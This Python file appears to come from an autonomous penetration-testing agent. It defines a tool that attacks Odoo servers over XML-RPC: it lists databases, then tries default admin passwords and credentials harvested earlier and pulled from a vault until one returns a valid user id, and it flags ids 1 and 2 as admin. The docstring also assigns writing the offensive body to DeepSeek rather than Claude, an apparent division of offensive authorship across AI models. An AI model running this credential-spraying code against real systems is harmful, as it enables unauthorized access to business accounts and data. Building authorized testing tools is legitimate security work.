# agent_alpha/tools/internal/access/odoo_access.py
"""odoo_access — internal Beta (STRIKE) tool: validate credentials against an
Odoo application over XML-RPC. Phase 4 (Odoo breadth arc, slice 1c), trimmed-internal.

This is the THIRD real access tool. Alongside cred_reuse + default_creds it is what
finally exercises ``ToolRegistry.ranked`` with a genuinely different fingerprint:
Odoo speaks XML-RPC (POST XML to ``/xmlrpc/2/common``/``/xmlrpc/2/db``), NOT an HTML
form login — so it is not a duplicate of default_creds' form-POST body (#6).

Proof model (READ BEFORE EDITING — this is the tier boundary):
  * The ONLY thing this tool proves is a VALID application credential, via a
    NON-DESTRUCTIVE signal: ``authenticate(db, login, password)`` returns an integer
    ``uid`` on success, ``False`` on failure. Reaching the wire is required (anti-#3:
    no proof-theatre), but nothing on the target changes.
  * required_auth = ACTIVE_APPROVED (initial access, not offensive). The run() body
    MUST NOT invoke any state-changing DB-manager action (create / duplicate / backup
    / restore / drop) and MUST NOT attempt the master-password. Those are DESTRUCTIVE,
    they require OFFENSIVE_APPROVED + blast-radius + human approval (Gamma/ANCHOR), and
    they are a SEPARATE slice — building them here would be a false-tier (#3) and would
    cross the Conductor's offensive gate. A `uid` is the ceiling of this tool.

Boundary (model routing, §12.15):
  * Claude owns: name / phase / required_auth / mitre_technique, applies_to(), the
    injected-deps shape, and the ToolResult finding contract below. All non-offensive.
  * Offensive-body author (DeepSeek — K21 lane, NOT Claude) owns: run() — discover the
    database (XML-RPC ``db.list()`` when list_db is on, else the ctx-supplied db),
    apply each candidate credential via ``authenticate``, VERIFY on a real integer uid,
    return CONTENT. NotImplementedError until authored.

Conforms to agent_alpha.tools.contracts.Tool (single canonical contract, #6). Returns
CONTENT, not refs — Beta.step() is the single persistence owner and mints retrievable
refs + REDACTS (scout/Laravel #45 pattern). The raw password is never re-exposed.

run() finding shape (on success):
    {
      "database": str,                 # the Odoo db the credential authenticated against
      "username": str,                 # login that authenticated
      "uid": int,                      # Odoo user id returned by authenticate (> 0)
      "access_level": "user" | "admin",# admin iff uid resolves to an admin group
      "credential_source": "default" | "reused",  # default dict vs Alpha-harvested
      "credential_node_id": str | None,# CREDENTIAL node id when source == "reused" (edge src)
      "proof_request": dict,           # safe fields only: endpoint + method + db + login
      "proof_response": dict,          # safe fields only: uid + server_version; NO secrets
    }
"""

from __future__ import annotations

import xml.etree.ElementTree as ET
from typing import Any
from urllib.parse import urlparse

from agent_alpha.graph.nodes import NodeType
from agent_alpha.tools.contracts import ResourceBudget, TargetContext, ToolResult

# ── Single-source markers for THIS tool (defined once; not a #7 dup) ───────
# An Odoo target is the trigger. Mirrors the recon probe's fingerprint vocab
# without importing it (that module is RECON-tier; this is an ACCESS tool).
_ODOO_TECH_MARKERS: tuple[str, ...] = ("odoo",)

# XML-RPC surfaces the offensive body speaks to (data, not logic — single source).
ODOO_XMLRPC_COMMON_PATH = "/xmlrpc/2/common"
ODOO_XMLRPC_DB_PATH = "/xmlrpc/2/db"

# UIDs that are unconditionally admin on default Odoo installs (non-destructive
# heuristic; no write or group-read performed — uid integer is the proof ceiling).
# uid 1 = __import__ / superuser on older installs; uid 2 = canonical admin.
_ODOO_ADMIN_UIDS: frozenset[int] = frozenset({1, 2})


def _is_odoo(ctx: TargetContext) -> bool:
    """True when the projected tech_stack fingerprints Odoo (asset tech_stack=['odoo']
    from the recon probe → projected into ctx.tech_stack)."""
    tech_blob = " ".join(ctx.tech_stack.values()).lower()
    return any(marker in tech_blob for marker in _ODOO_TECH_MARKERS)


def _odoo_access_already_proven(ctx: TargetContext) -> bool:
    """True when a prior finding already established Odoo access — don't re-auth."""
    return any("odoo" in f.lower() and "uid" in f.lower() for f in ctx.prior_findings)


class OdooAccessTool:
    """Validate application credentials against an Odoo target over XML-RPC."""

    name = "odoo_access"
    phase = "access"
    required_auth = "ACTIVE_APPROVED"
    # Valid Accounts (parent): the credential source is mixed — default Odoo logins
    # AND Alpha-harvested creds — and the novelty is the XML-RPC application surface,
    # not the account *type*. A single technique id for this tool (anti-#7).
    mitre_technique = "T1078"

    def __init__(
        self,
        *,
        http_client: Any = None,
        graph_store: Any = None,
        secrets_manager: Any = None,
    ) -> None:
        # Injected so run() can reach the wire + resolve reused creds. None is allowed
        # for applies_to()/conformance use; run() requires a real http_client.
        self._http_client = http_client
        self._graph_store = graph_store
        self._secrets_manager = secrets_manager

    def applies_to(self, ctx: TargetContext) -> float:
        """Relevance 0..1 from context — the registry ranks, the agent never guesses
        (K11). High on an Odoo target (this is THE Odoo-specific access vector, ranked
        above the generic default_creds form-POST there); minimal off-Odoo (so on a
        non-Odoo target the registry keeps default_creds/cred_reuse ahead of it);
        near-zero once Odoo access is already proven."""
        if not _is_odoo(ctx):
            return 0.15
        if _odoo_access_already_proven(ctx):
            return 0.1
        return 0.85

    def run(self, ctx: TargetContext, budget: ResourceBudget) -> ToolResult:
        """OFFENSIVE BODY — DeepSeek (K21 lane, NOT Claude).

        Validate application credentials against the Odoo target over XML-RPC:

          1. DISCOVER the database. If ``db.list()`` (POST XML to ODOO_XMLRPC_DB_PATH)
             is enabled, enumerate; otherwise use a ctx-supplied / single db. Never
             assume — an empty/failed list is a failure, not a silent success (#3).
          2. APPLY each candidate credential via ``authenticate(db, login, password)``
             (POST XML to ODOO_XMLRPC_COMMON_PATH). Candidates = built-in Odoo defaults
             (e.g. admin/admin) AND — when graph_store holds CREDENTIAL nodes — creds
             resolved from the vault via secrets_manager.retrieve(). Stay within
             ``budget.max_requests``.
          3. VERIFY on a real integer ``uid`` (> 0). ``False``/``0``/fault → not access.
             This is the ONLY proof; do NOT call any DB-manager create/duplicate/backup/
             restore/drop action and do NOT attempt the master password — those exceed
             required_auth (ACTIVE_APPROVED) and are a separate OFFENSIVE slice.
          4. Return CONTENT per the module-docstring finding shape (raw password NEVER
             returned). Beta.step() persists + mints refs + redacts.

        success=True only on a verified uid; otherwise ToolResult(success=False).
        """
        if self._http_client is None:
            raise ValueError("OdooAccessTool.run requires an injected http_client")

        host = urlparse(ctx.target).hostname or ctx.target
        base_url = ctx.target.rstrip("/")

        requests_used = 0

        # ── 1. DISCOVER database via XML-RPC db.list() ─────────────
        db_list_xml = _build_xmlrpc_request("list", [])
        db_url = f"{base_url}{ODOO_XMLRPC_DB_PATH}"
        db_names: list[str] = []
        server_version: str | None = None
        if requests_used < budget.max_requests:
            try:
                db_resp = self._http_client.post(
                    db_url,
                    data=db_list_xml,
                    headers={"Content-Type": "text/xml"},
                )
                requests_used += 1
                if getattr(db_resp, "status_code", 0) == 200:
                    parsed = _parse_xmlrpc_response(getattr(db_resp, "text", ""))
                    if isinstance(parsed, list):
                        db_names = [str(d) for d in parsed if str(d)]
            except Exception:
                pass

        # Fall back: derive db name from host label (common Odoo convention)
        if not db_names:
            derived = host.split(".")[0] if host else ""
            if derived:
                db_names = [derived]

        if not db_names:
            return ToolResult(
                tool=self.name,
                success=False,
                confidence=0.0,
                error="could not discover any Odoo database name",
            )

        # ── 2. ASSEMBLE candidate credentials ──────────────────────
        candidates: list[tuple[str, str, str, str | None]] = []
        for user, pwd in (("admin", "admin"), ("admin", "password")):
            candidates.append((user, pwd, "default", None))

        if self._graph_store is not None and self._secrets_manager is not None:
            try:
                cred_nodes = self._graph_store.nodes_by_type(NodeType.CREDENTIAL)
                for node in cred_nodes:
                    props = node.properties
                    if not hasattr(props, "secret_ref") or not hasattr(props, "username"):
                        continue
                    try:
                        secret = self._secrets_manager.retrieve(props.secret_ref)
                    except Exception:
                        continue
                    candidates.append((props.username, secret, "reused", node.id))
            except Exception:
                pass

        # ── 3. APPLY each credential via XML-RPC authenticate ──────
        auth_url = f"{base_url}{ODOO_XMLRPC_COMMON_PATH}"

        # Reserve 2 slots: 1 for version + at least 1 for authenticate.
        # If the budget is too tight, skip version so authenticate always runs.
        if requests_used + 2 <= budget.max_requests:
            try:
                ver_xml = _build_xmlrpc_request("version", [])
                ver_resp = self._http_client.post(
                    auth_url,
                    data=ver_xml,
                    headers={"Content-Type": "text/xml"},
                )
                requests_used += 1
                if getattr(ver_resp, "status_code", 0) == 200:
                    ver_parsed = _parse_xmlrpc_response(getattr(ver_resp, "text", ""))
                    if isinstance(ver_parsed, dict):
                        server_version = ver_parsed.get("server_version")
            except Exception:
                pass

        for db_name in db_names:
            for username, password, cred_source, cred_node_id in candidates:
                if requests_used >= budget.max_requests:
                    break  # budget exhausted — fall through to failure return

                auth_xml = _build_xmlrpc_request("authenticate", [db_name, username, password, {}])
                try:
                    auth_resp = self._http_client.post(
                        auth_url,
                        data=auth_xml,
                        headers={"Content-Type": "text/xml"},
                    )
                    requests_used += 1
                except Exception:
                    continue

                if getattr(auth_resp, "status_code", 0) != 200:
                    continue

                uid = _parse_xmlrpc_response(getattr(auth_resp, "text", ""))

                # ── 4. VERIFY: integer uid > 0 is the ONLY valid proof ────────────────
                # False, 0, XML-RPC <fault>, or unparseable body all fail here.
                if not isinstance(uid, int) or uid <= 0:
                    continue

                # Determine access level — non-destructive uid heuristic only.
                # uid 1 (__import__ / superuser) and uid 2 (canonical admin) are
                # both treated as admin on default Odoo installs.  No write or
                # group-read is performed (tier boundary: uid integer is the ceiling).
                access_level: str = "admin" if uid in _ODOO_ADMIN_UIDS else "user"

                # ── 5. RETURN CONTENT — raw password intentionally absent ─────────────
                finding: dict[str, Any] = {
                    "database": db_name,
                    "username": username,
                    "uid": uid,
                    "access_level": access_level,
                    "credential_source": cred_source,
                    "credential_node_id": cred_node_id,
                    "proof_request": {
                        "endpoint": ODOO_XMLRPC_COMMON_PATH,
                        "method": "authenticate",
                        "database": db_name,
                        "login": username,
                        # password intentionally absent
                    },
                    "proof_response": {
                        "uid": uid,
                        "server_version": server_version,
                        # no secrets, no session tokens
                    },
                }

                return ToolResult(
                    tool=self.name,
                    success=True,
                    confidence=0.9,
                    findings=(finding,),
                )

        # ── No candidate credential authenticated ────────────────────────────────
        return ToolResult(
            tool=self.name,
            success=False,
            confidence=0.0,
            error="no candidate credential authenticated over XML-RPC",
        )


# ── XML-RPC helpers (data, not logic — single source for this tool) ───────


def _build_xmlrpc_request(method: str, params: list[Any]) -> str:
    """Build an XML-RPC methodCall string."""
    param_xml = _params_to_xml(params)
    return (
        '<?xml version="1.0"?>'
        "<methodCall>"
        f"<methodName>{method}</methodName>"
        f"<params>{param_xml}</params>"
        "</methodCall>"
    )


def _params_to_xml(params: list[Any]) -> str:
    parts = []
    for p in params:
        parts.append(f"<param>{_value_to_xml(p)}</param>")
    return "".join(parts)


def _value_to_xml(val: Any) -> str:
    if isinstance(val, bool):
        return f"<value><boolean>{1 if val else 0}</boolean></value>"
    if isinstance(val, int):
        return f"<value><int>{val}</int></value>"
    if isinstance(val, float):
        return f"<value><double>{val}</double></value>"
    if isinstance(val, str):
        return f"<value><string>{val}</string></value>"
    if isinstance(val, (list, tuple)):
        items = "".join(_value_to_xml(v) for v in val)
        return f"<value><array><data>{items}</data></array></value>"
    if isinstance(val, dict):
        members = "".join(
            f"<member><name>{k}</name>{_value_to_xml(v)}</member>"
            for k, v in val.items()
        )
        return f"<value><struct>{members}</struct></value>"
    return "<value><string></string></value>"


def _parse_xmlrpc_response(body: str) -> Any:
    """Parse an XML-RPC methodResponse body. Returns the value, or None on fault/error."""
    try:
        root = ET.fromstring(body)
    except ET.ParseError:
        return None

    fault = root.find(".//fault")
    if fault is not None:
        return None

    param = root.find(".//params/param/value")
    if param is None:
        return None

    return _xml_to_value(param)


def _xml_to_value(elem: ET.Element) -> Any:
    """Recursively convert an XML-RPC value element to a Python object."""
    # Check for typed value
    child = elem[0] if len(elem) > 0 else None

    if child is not None:
        tag = child.tag.lower()

        if tag == "int" or tag == "i4":
            try:
                return int(child.text or "0")
            except ValueError:
                return 0

        if tag == "boolean":
            return (child.text or "0").strip() == "1"

        if tag == "double":
            try:
                return float(child.text or "0.0")
            except ValueError:
                return 0.0

        if tag == "string":
            return child.text or ""

        if tag == "array":
            data = child.find("data")
            if data is None:
                return []
            return [_xml_to_value(v) for v in data.findall("value")]

        if tag == "struct":
            result: dict[str, Any] = {}
            for member in child.findall("member"):
                name_elem = member.find("name")
                value_elem = member.find("value")
                if name_elem is not None and value_elem is not None:
                    result[name_elem.text or ""] = _xml_to_value(value_elem)
            return result

    # Untyped value — try int, then string
    text = elem.text or ""
    try:
        return int(text)
    except ValueError:
        return text
